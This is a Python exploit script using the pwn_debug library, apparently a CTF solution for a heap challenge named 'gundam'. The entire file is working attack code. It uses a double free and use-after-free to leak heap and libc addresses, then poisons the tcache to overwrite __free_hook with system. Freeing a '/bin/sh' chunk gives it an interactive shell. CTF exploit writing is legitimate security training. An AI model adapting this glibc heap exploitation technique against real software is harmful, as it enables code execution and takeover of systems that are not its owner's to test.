# File: exp.py
# Author: raycp
# Date: 2019-06-02
# Description: exp for gundam

from pwn_debug import *


pdbg=pwn_debug("./gundam")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def add(name,typ):
    p.recvuntil("choice : ")
    p.sendline("1")
    p.recvuntil("gundam :")
    p.send(name)
    p.recvuntil("gundam :")
    p.sendline(str(typ))


def visit():
    p.recvuntil("choice : ")
    p.sendline("2")


def destroy(idx):
    p.recvuntil("choice : ")
    p.sendline("3")
    p.recvuntil("Destory:")
    p.sendline(str(idx))


def blow_up():
    p.recvuntil("choice : ")
    p.sendline("4")

def pwn():
    
    #pdbg.bp([0xe02])
    add('a'*0x20,1) #0
    add('/bin/sh\x00',1) #1

    destroy(0)
    destroy(0)

    # step 1 uaf 
    add('\x90',1) #2
    #add('\x90',1) #3
    # step 2 leak heap address by gundam 2
    visit()
    p.recvuntil("Gundam[2] :")
    heap_base=u64(p.recvuntil("Type")[:-4].ljust(8,'\x00'))-0x290
    log.info("leak heap base: %s"%(hex(heap_base)))
    
    # step 3 fill the tcache
    for i in range(0,6):
        destroy(1)

    # step 4 free the name chunk to unsorted bin
    destroy(0)

    # step 5 leak libc address
    visit()
    p.recvuntil("Gundam[2] :")
    libc_base=u64(p.recvuntil("Type")[:-4].ljust(8,'\x00'))-libc.symbols['main_arena']-0x60
    log.info("leak libc base: %s"%(hex(libc_base)))
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']

   
    # step 6 tcache attack to malloc out free_hook and write system addr to it
    pdbg.bp([0xbb8,0xbdc,0xe02])
    blow_up()  # put chunk with 0x30 to tcache
    add(p64(free_hook),1)
    add('/bin/sh\x00',1)
    add(p64(system_addr),1)

    # step 7 trigger free to get shell.
    destroy(1)

    p.interactive() 

if __name__ == '__main__':
   pwn()


